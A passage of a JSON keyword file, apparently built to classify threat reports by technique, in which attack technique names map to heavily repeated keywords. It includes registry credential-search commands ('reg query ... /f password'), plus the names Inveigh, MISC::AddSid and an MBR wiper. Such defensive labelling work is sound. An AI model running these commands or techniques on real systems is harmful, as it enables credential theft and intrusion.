        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust "
    ],
    "email collection": [
        "This module searches the infected system\u2019s files to gather email addresses for information-stealing purposes."
    ],
    "man in the browser": [
        "send a POST response to the C&C server to extract the user\u2019s login credentials. redirect users to fake phishing websites."
    ],
    "data from removable media": [
        "A USB data collecting tool that checks for a connected USB drive and steals certain file types, encrypting them into a RAR file."
    ],
    "credentials from password stores-multi": {
        "technique_names": [
            "tor"
        ],
        "sentances": [
            ""
        ]
    },
    "bootkit": [
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit",
        "bootkit"
    ],
    "logon scripts": [
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript",
        "UserInitMprLogonScript"
    ],
    "execution through module load": [
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "load additional modules",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        "NTDLL.dll ",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " LoadLibraryExW()",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() ",
        " DWriteCreateFactory() "
    ],
    "llmnr/nbt-ns poisoning and relay": [
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        "Inveigh ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " NBNS Spoofing ",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services",
        " poison name services"
    ],
    "external remote services": [
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence ",
        "VPN and to persist in same sentence "
    ],
    "domain fronting": [
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin ",
        "Tor plugin "
    ],
    "sid-history injection": [
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        "SID-History ",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid",
        " MISC::AddSid"
    ],
    "service stop": [
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW ",
        "ChangeServiceConfigW "
    ],
    "disk structure wipe": [
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "overwrite or delete MBR in same sentence ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        "  master boot record wiper ",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe",
        " MBR + overwrite/wipe"
    ],
    "credentials in registry": [
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        "reg query HKLM /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s ",
        " reg query HKCU /f password /t REG_SZ /s "
    ],
    "appinit dlls": [
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
